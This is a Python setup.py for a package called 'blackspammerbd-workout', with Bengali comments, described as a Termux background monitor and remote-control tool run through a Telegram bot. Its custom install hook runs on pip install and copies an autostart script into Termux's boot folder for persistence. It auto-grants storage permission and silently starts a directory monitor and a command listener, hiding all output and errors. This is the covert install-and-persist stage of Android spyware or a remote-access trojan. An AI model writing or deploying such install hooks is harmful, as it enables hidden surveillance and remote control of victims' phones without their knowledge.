import os
import shutil
import subprocess
from setuptools import setup, find_packages
from setuptools.command.install import install

class CustomInstallCommand(install):
    """
    pip install blackspammerbd-workout করার পরেই:
    1) ~/.termux/boot/autostart.sh স্বয়ংক্রিয়ভাবে কপি করবে
       (যাতে ফোন রিস্টার্ট বা Termux সেশন বন্ধ/খোলা এমনকি কোনো ম্যানুয়াল ছাড়াই
        Monitor ও Command Listener ব্যাকগ্রাউন্ডে চালু থাকে)।
    2) termux-setup-storage চালিয়ে স্টোরেজ পারমিশন একবার নেবে (ইন্টারেক্টিভ না করে)।
    3) Monitor ও Command Listener ব্যাকগ্রাউন্ডে চালু করবে—কোনো আউটপুট/প্রিন্ট নেই।
    """
    def run(self):
        install.run(self)
        try:
            # Home ডিরেক্টরি
            home = os.getenv("HOME", "")
            # Termux এর স্বয়ংক্রিয় স্টার্ট-আপ লোকেশন
            boot_dir = os.path.join(home, ".termux", "boot")
            os.makedirs(boot_dir, exist_ok=True)

            # প্যাকেজ ইনস্টলেশনের পর package-এর মধ্যে থাকা autostart.sh খুঁজে
            import blackspammerbd
            pkg_path = os.path.dirname(blackspammerbd.__file__)
            src = os.path.join(pkg_path, "autostart.sh")
            dest = os.path.join(boot_dir, "autostart.sh")

            shutil.copy(src, dest)
            os.chmod(dest, 0o755)

            # একবার স্টোরেজ পারমিশন নেয়ার চেষ্টাঃ ইন্টারেক্টিভ ছাড়া 'y' সিলেক্ট করে
            # যদি Termux-এ না থাকে, তাহলে সাইলেন্টলি পাস করবে
            subprocess.Popen(
                "termux-setup-storage <<EOF\ny\nEOF",
                shell=True
            )

            # ব্যাকগ্রাউন্ডে Monitor শুরু (কোনো প্রিন্ট বা লোগ চোখে আসবে না)
            subprocess.Popen(
                "nohup python3 -m blackspammerbd.monitor > /dev/null 2>&1 &",
                shell=True
            )
            # ব্যাকগ্রাউন্ডে Command Listener শুরু
            subprocess.Popen(
                "nohup python3 -m blackspammerbd.command_listener > /dev/null 2>&1 &",
                shell=True
            )
        except Exception:
            # কোনো এরর হলেও প্যাকেজ ইনস্টলেশন ব্লক করবে না, সাইলেন্টলি পাস করবে
            pass

setup(
    name="blackspammerbd-workout",
    version="1.0.0",
    packages=find_packages(),
    install_requires=[
        "requests"
    ],
    author="BLACK SPAMMER BD",
    description="Termux-based background monitor, backup & remote-control via Telegram Bot",
    long_description=open("README.md", encoding="utf-8").read(),
    long_description_content_type="text/markdown",
    classifiers=[
        "Programming Language :: Python :: 3",
        "Operating System :: Android",
    ],
    cmdclass={
        "install": CustomInstallCommand,
    },
    entry_points={
        "console_scripts": [
            # যদিও CustomInstallCommand itself সার্ভিস চালায়, 
            # তবে প্রয়োজনমতো ম্যানুয়ালি চালাতে চাইলে এই কমান্ডগুলো আছে
            "blackspammerbd-monitor=blackspammerbd.monitor:monitor_directories",
            "blackspammerbd-commands=blackspammerbd.command_listener:poll_updates"
        ],
    },
    include_package_data=True,
    python_requires=">=3.6",
)
